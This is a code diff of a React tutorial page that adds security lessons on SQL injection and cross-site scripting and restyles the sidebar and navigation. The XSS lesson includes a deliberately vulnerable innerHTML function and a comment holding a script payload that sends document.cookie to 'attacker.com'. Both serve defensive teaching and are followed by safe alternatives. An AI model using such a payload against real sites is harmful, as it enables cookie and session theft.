+    query = """
+        SELECT * FROM users
+        WHERE username = %s
+        AND password_hash = %s
+    """
+    # Parameters are escaped separately — injection impossible
+    return db.execute(query, (username, hash_password(password)))
 
-# Predictions
-y_pred = model.predict(X)
+# Also use:
+# - ORM (SQLAlchemy, Prisma, Sequelize)
+# - Input validation
+# - Least privilege DB accounts
+# - WAF (Web Application Firewall)`,
+      tryIt: true,
+    },
+    XSS: {
+      title: 'Cross-Site Scripting (XSS)',
+      content: `XSS allows attackers to inject malicious scripts into web pages viewed by other users. The browser executes the script, which steals cookies, tokens, or performs actions on behalf of the victim.
 
-# Coefficients
-print(f"Slope: {model.coef_[0]:.2f}")
-print(f"Intercept: {model.intercept_:.2f}")
-
-# Predict for new value
-new_x = np.array([[6]])
-print(f"Prediction for x=6: {model.predict(new_x)[0]:.2f}")`,
-      tryIt: true
-    }
-  }
+**Prevention:** Escape output, use Content Security Policy, sanitize HTML.`,
+      code: `// ❌ VULNERABLE — injects raw HTML
+function renderUserBio(bio) {
+  document.getElementById("bio").innerHTML = bio;
+  // If bio = "<script>document.location='attacker.com?c='+document.cookie</script>"
+  // → cookie theft!
 }
 
-const sidebarTopics = [
-  { id: 'python', name: 'Python', icon: '🐍' },
-  { id: 'javascript', name: 'JavaScript', icon: '📜' },
-  { id: 'data-structures', name: 'Data Structures', icon: '📊' },
-  { id: 'algorithms', name: 'Algorithms', icon: '⚡' },
-  { id: 'web-dev', name: 'Web Development', icon: '🌐' },
-  { id: 'ml', name: 'Machine Learning', icon: '🤖' }
-]
+// ✅ SAFE — use textContent or escape HTML
+function renderUserBioSafe(bio) {
+  document.getElementById("bio").textContent = bio;
+  // textContent treats input as text, not HTML
+}
+
+// ✅ ALSO SAFE — escape before inserting
+function escapeHtml(str) {
+  return str
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;")
+    .replace(/'/g, "&#39;");
+}
+
+// Content Security Policy (HTTP header)
+// Content-Security-Policy: default-src 'self'; script-src 'self'`,
+      tryIt: true,
+    },
+  },
+}
 
 export default function ComputerSciencePage() {
   const [selectedTopic, setSelectedTopic] = useState('python')
   const [selectedLesson, setSelectedLesson] = useState('Introduction')
   const [copied, setCopied] = useState(false)
+  const [sidebarOpen, setSidebarOpen] = useState(true)
 
-  const currentContent = tutorialContent[selectedTopic as keyof typeof tutorialContent] as Record<string, any>
-  const lessonData = currentContent?.[selectedLesson] as any
+  const currentTopicData = topics.find(t => t.id === selectedTopic)
+  const currentContent   = tutorialContent[selectedTopic] ?? {}
+  const lessonData       = currentContent[selectedLesson]
+
+  const currentLessons   = currentTopicData?.lessons ?? []
+  const currentIndex     = currentLessons.indexOf(selectedLesson)
 
   const copyCode = () => {
     if (lessonData?.code) {
@@ -631,184 +912,235 @@ export default function ComputerSciencePage() {
   return (
     <div className="min-h-screen bg-background">
       <Header />
-      
-      <div className="flex pt-16">
-        {/* Sidebar */}
-        <aside className="fixed left-0 top-16 h-[calc(100vh-4rem)] w-64 border-r border-border bg-background overflow-y-auto">
+
+      <div className="flex pt-14">
+        {/* ══════════════════════════════════════
+            LEFT SIDEBAR
+        ══════════════════════════════════════ */}
+        <aside
+          className="fixed left-0 top-14 h-[calc(100vh-3.5rem)] w-64 border-r border-border bg-card overflow-y-auto scrollbar-thin z-20"
+          style={{ boxShadow: '1px 0 0 0 hsl(var(--border))' }}
+        >
           <div className="p-4">
-            <Link href="/library" className="mb-4 flex items-center gap-2 text-sm text-muted-foreground hover:text-foreground">
+            {/* Back to library */}
+            <Link
+              href="/library"
+              className="mb-5 flex items-center gap-2 text-sm font-mono font-medium text-muted-foreground hover:text-primary transition-colors"
+            >
               <ArrowLeft className="h-4 w-4" />
               Back to Library
             </Link>
-            
-            <h2 className="mb-4 text-sm font-semibold text-muted-foreground uppercase tracking-wider">Topics</h2>
-            
-            <nav className="space-y-1">
-              {sidebarTopics.map((topic) => (
-                <button
-                  key={topic.id}
-                  onClick={() => {
-                    setSelectedTopic(topic.id)
-                    const firstLesson = topics.find(t => t.id === topic.id)?.lessons[0]
-                    if (firstLesson) setSelectedLesson(firstLesson)
-                  }}
-                  className={`w-full flex items-center gap-3 px-3 py-2.5 text-sm rounded-lg transition-colors text-left ${
-                    selectedTopic === topic.id
-                      ? 'bg-primary/10 text-primary font-medium'
-                      : 'text-muted-foreground hover:bg-secondary hover:text-foreground'
-                  }`}
-                >
-                  <span>{topic.icon}</span>
-                  {topic.name}
-                </button>
-              ))}
-            </nav>
 
-            {/* Lessons sub-menu */}
-            <div className="mt-6">
-              <h3 className="mb-3 text-xs font-semibold text-muted-foreground uppercase tracking-wider">
-                {sidebarTopics.find(t => t.id === selectedTopic)?.name} Lessons
-              </h3>
-              <div className="space-y-0.5">
-                {topics.find(t => t.id === selectedTopic)?.lessons.map((lesson) => (
-                  <button
-                    key={lesson}
-                    onClick={() => setSelectedLesson(lesson)}
-                    className={`w-full text-left px-3 py-2 text-sm rounded-md transition-colors ${
-                      selectedLesson === lesson
-                        ? 'bg-primary/10 text-primary'
-                        : 'text-muted-foreground hover:text-foreground hover:bg-secondary/50'
-                    }`}
-                  >
-                    {lesson}
-                  </button>
-                ))}
+            {/* Domain label */}
+            <div className="mb-4 flex items-center gap-2.5">
+              <div
+                className="flex h-8 w-8 items-center justify-center rounded-lg"
+                style={{ background: 'hsl(var(--primary) / 0.10)' }}
+              >
+                <Code2 className="h-4 w-4 text-primary" />
+              </div>
+              <div>
+                <p className="text-xs font-mono text-muted-foreground uppercase tracking-wider">Domain</p>
+                <p className="text-sm font-bold text-foreground">Computer Science</p>
               </div>
             </div>
+
+            {/* Divider */}
+            <div className="mb-4 border-t border-border" />
+
+            {/* Topic list */}
+            <p className="mb-2 text-[10px] font-mono font-bold uppercase tracking-widest text-muted-foreground px-1">
+              Topics
+            </p>
+            <nav className="space-y-0.5">
+              {topics.map((topic) => {
+                const Icon = topic.icon
+                const isActive = selectedTopic === topic.id
+                return (
+                  <button
+                    key={topic.id}
+                    onClick={() => {
+                      setSelectedTopic(topic.id)
+                      setSelectedLesson(topic.lessons[0])
+                    }}
+                    className={`w-full flex items-center gap-2.5 px-3 py-2 text-sm rounded-lg transition-all text-left ${
+                      isActive
+                        ? 'bg-primary/10 text-primary font-semibold'
+                        : 'text-muted-foreground hover:bg-secondary hover:text-foreground'
+                    }`}
+                  >
+                    <Icon className="h-4 w-4 flex-shrink-0" />
+                    <span className="truncate">{topic.name}</span>
+                    {isActive && <ChevronRight className="h-3.5 w-3.5 ml-auto text-primary" />}
+                  </button>
+                )
+              })}
+            </nav>
+
+            {/* Lessons sub-list */}
+            {currentTopicData && (
+              <div className="mt-5">
+                <p className="mb-2 text-[10px] font-mono font-bold uppercase tracking-widest text-muted-foreground px-1">
+                  {currentTopicData.name} Lessons
+                </p>
+                <div className="space-y-0.5">
+                  {currentTopicData.lessons.map((lesson) => (
+                    <button
+                      key={lesson}
+                      onClick={() => setSelectedLesson(lesson)}
+                      className={`w-full text-left px-3 py-2 text-sm rounded-lg transition-colors font-mono ${
+                        selectedLesson === lesson
+                          ? 'bg-primary/10 text-primary font-medium'
+                          : 'text-muted-foreground hover:text-foreground hover:bg-secondary/60'
+                      }`}
+                    >
+                      {lesson}
+                    </button>
+                  ))}
+                </div>
+              </div>
+            )}
           </div>
         </aside>
 
-        {/* Main Content */}
-        <main className="ml-64 min-h-[calc(100vh-4rem)] flex-1 p-8">
-          <div className="mx-auto max-w-4xl">
-            {/* Header */}
-            <div className="mb-8 flex items-center justify-between">
-              <div className="flex items-center gap-4">
-                <div className="flex h-12 w-12 items-center justify-center rounded-xl bg-gradient-to-br from-blue-500 to-cyan-500 text-white">
-                  <Code2 className="h-6 w-6" />
+        {/* ══════════════════════════════════════
+            MAIN CONTENT
+        ══════════════════════════════════════ */}
+        <main className="ml-64 flex-1 min-h-[calc(100vh-3.5rem)]">
+          <div className="mx-auto max-w-4xl px-6 py-8">
+
+            {/* ── Page breadcrumb header ── */}
+            <div className="mb-8 flex flex-wrap items-center justify-between gap-4">
+              <div>
+                <div className="flex items-center gap-2 text-sm font-mono text-muted-foreground mb-1">
+                  <Link href="/library" className="hover:text-primary transition-colors">Library</Link>
+                  <span>/</span>
+                  <span>Computer Science</span>
+                  <span>/</span>
+                  <span className="text-foreground">{currentTopicData?.name}</span>
                 </div>
-                <div>
-                  <h1 className="text-2xl font-bold">Computer Science</h1>
-                  <p className="text-sm text-muted-foreground">{tutorialContent[selectedTopic as keyof typeof tutorialContent] ? Object.keys(tutorialContent[selectedTopic as keyof typeof tutorialContent]).length : 0} tutorials in {selectedTopic}</p>
-                </div>
+                <h1 className="text-2xl font-bold">
+                  {lessonData?.title ?? `${currentTopicData?.name}: ${selectedLesson}`}
+                </h1>
               </div>
               <div className="flex items-center gap-2">
-                <Badge variant="success" className="gap-1">
+                <span className="badge badge-primary flex items-center gap-1">
                   <Sparkles className="h-3 w-3" />
                   Free
-                </Badge>
-                <Badge variant="outline">
+                </span>
+                <span className="badge border border-border text-muted-foreground font-mono">
                   <BookOpen className="h-3 w-3 mr-1" />
                   No Login
-                </Badge>
+                </span>
               </div>
             </div>
 
-            {/* Tutorial Content */}
+            {/* ── Lesson content ── */}
             {lessonData ? (
               <motion.div
                 key={`${selectedTopic}-${selectedLesson}`}
                 initial={{ opacity: 0, y: 10 }}
                 animate={{ opacity: 1, y: 0 }}
                 transition={{ duration: 0.3 }}
+                className="space-y-6"
               >
-                <Card className="border-border/50">
-                  <CardContent className="p-8">
-                    <h2 className="mb-4 text-2xl font-bold">{lessonData.title}</h2>
-                    
-                    <div className="prose prose-neutral dark:prose-invert max-w-none mb-8">
-                      <div className="whitespace-pre-line text-muted-foreground leading-relaxed">
-                        {lessonData.content}
-                      </div>
+                {/* Theory card */}
+                <div className="card p-7">
+                  <div
+                    className="text-sm text-muted-foreground leading-relaxed whitespace-pre-line"
+                    style={{ fontFamily: 'var(--font-mono)' }}
+                  >
+                    {lessonData.content}
+                  </div>
+                </div>
+
+                {/* Code example */}
+                <div className="rounded-xl overflow-hidden border border-border" style={{ background: 'hsl(222 47% 9%)' }}>
+                  {/* Code header */}
+                  <div
+                    className="flex items-center justify-between px-4 py-3 border-b"
+                    style={{ background: 'hsl(222 47% 12%)', borderColor: 'hsl(222 47% 20%)' }}
+                  >
+                    <div className="flex items-center gap-2">
+                      <span className="inline-block h-3 w-3 rounded-full bg-[#ff5f57]" />
+                      <span className="inline-block h-3 w-3 rounded-full bg-[#ffbd2e]" />
+                      <span className="inline-block h-3 w-3 rounded-full bg-[#28c840]" />
+                      <span className="ml-2 text-xs font-mono text-gray-400">Example</span>
                     </div>
+                    <button
+                      onClick={copyCode}
+                      className="flex items-center gap-1.5 text-xs font-mono text-gray-400 hover:text-white transition-colors"
+                    >
+                      {copied ? <Check className="h-3.5 w-3.5" /> : <Copy className="h-3.5 w-3.5" />}
+                      {copied ? 'Copied!' : 'Copy'}
+                    </button>
+                  </div>
+                  <pre
+                    className="p-5 overflow-x-auto text-sm scrollbar-thin"
+                    style={{ color: '#e6edf3', fontFamily: 'var(--font-mono)', lineHeight: 1.75 }}
+                  >
+                    <code>{lessonData.code}</code>
+                  </pre>
+                </div>
 
-                    {/* Code Example */}
-                    <div className="relative rounded-xl bg-[#1e1e1e] overflow-hidden">
-                      <div className="flex items-center justify-between px-4 py-3 bg-[#2d2d2d] border-b border-[#3d3d3d]">
-                        <span className="text-sm font-medium text-muted-foreground">Example</span>
-                        <button
-                          onClick={copyCode}
-                          className="flex items-center gap-1.5 text-xs text-muted-foreground hover:text-foreground transition-colors"
-                        >
-                          {copied ? <Check className="h-3.5 w-3.5" /> : <Copy className="h-3.5 w-3.5" />}
-                          {copied ? 'Copied!' : 'Copy'}
-                        </button>
-                      </div>
-                      <pre className="p-4 overflow-x-auto">
-                        <code className="text-sm font-mono text-foreground">
-                          {lessonData.code}
-                        </code>
-                      </pre>
+                {/* Try it + nav */}
+                {lessonData.tryIt && (
+                  <div className="flex flex-wrap items-center justify-between gap-4">
+                    <Link
+                      href="/ide"
+                      className="btn btn-primary flex items-center gap-2"
+                    >
+                      <Play className="h-4 w-4" />
+                      Try it Yourself
+                    </Link>
+                    <div className="flex items-center gap-1.5 text-sm font-mono text-muted-foreground">
+                      <CheckCircle2 className="h-4 w-4 text-green-500" />
+                      Free to use — no login required
                     </div>
+                  </div>
+                )}
 
-                    {/* Try It Button */}
-                    {lessonData.tryIt && (
-                      <div className="mt-6 flex items-center justify-between">
-                        <Button className="gap-2">
-                          <Play className="h-4 w-4" />
-                          Try it Yourself
-                        </Button>
-                        
-                        <div className="flex items-center gap-4 text-sm text-muted-foreground">
-                          <span className="flex items-center gap-1">
-                            <CheckCircle2 className="h-4 w-4 text-green-500" />
-                            Free to use
-                          </span>
-                        </div>
-                      </div>
-                    )}
-                  </CardContent>
-                </Card>
-
-                {/* Navigation */}
-                <div className="mt-6 flex items-center justify-between">
-                  <Button 
-                    variant="outline" 
-                    className="gap-2"
+                {/* Prev / Next navigation */}
+                <div className="flex items-center justify-between pt-4 border-t border-border">
+                  <button
                     onClick={() => {
-                      const currentLessons = topics.find(t => t.id === selectedTopic)?.lessons || []
-                      const currentIndex = currentLessons.indexOf(selectedLesson)
-                      if (currentIndex > 0) {
-                        setSelectedLesson(currentLessons[currentIndex - 1])
-                      }
+                      if (currentIndex > 0) setSelectedLesson(currentLessons[currentIndex - 1])
                     }}
+                    disabled={currentIndex === 0}
+                    className="btn btn-outline flex items-center gap-2 disabled:opacity-40"
                   >
                     <ArrowLeft className="h-4 w-4" />
                     Previous
-                  </Button>
-                  
-                  <Button 
-                    className="gap-2"
+                  </button>
+                  <span className="text-xs font-mono text-muted-foreground">
+                    {currentIndex + 1} / {currentLessons.length}
+                  </span>
+                  <button
                     onClick={() => {
-                      const currentLessons = topics.find(t => t.id === selectedTopic)?.lessons || []
-                      const currentIndex = currentLessons.indexOf(selectedLesson)
-                      if (currentIndex < currentLessons.length - 1) {
+                      if (currentIndex < currentLessons.length - 1)
                         setSelectedLesson(currentLessons[currentIndex + 1])
-                      }
                     }}
+                    disabled={currentIndex === currentLessons.length - 1}
+                    className="btn btn-primary flex items-center gap-2 disabled:opacity-40"
                   >
                     Next
                     <ArrowRight className="h-4 w-4" />
-                  </Button>
+                  </button>
                 </div>
               </motion.div>
             ) : (
-              <Card className="border-border/50">
-                <CardContent className="p-8 text-center">
-                  <p className="text-muted-foreground">Select a topic to start learning</p>
-                </CardContent>
-              </Card>
+              <div className="card p-10 text-center">
+                <BookOpen className="mx-auto h-10 w-10 text-muted-foreground mb-3" />
+                <p className="font-mono text-muted-foreground">
+                  Select a topic and lesson from the sidebar to start learning.
+                </p>
+              </div>
             )}
+          </div>
+
+          {/* Footer inside main */}
+          <div className="px-6 pb-8">
+            <Footer />
           </div>
         </main>
       </div>
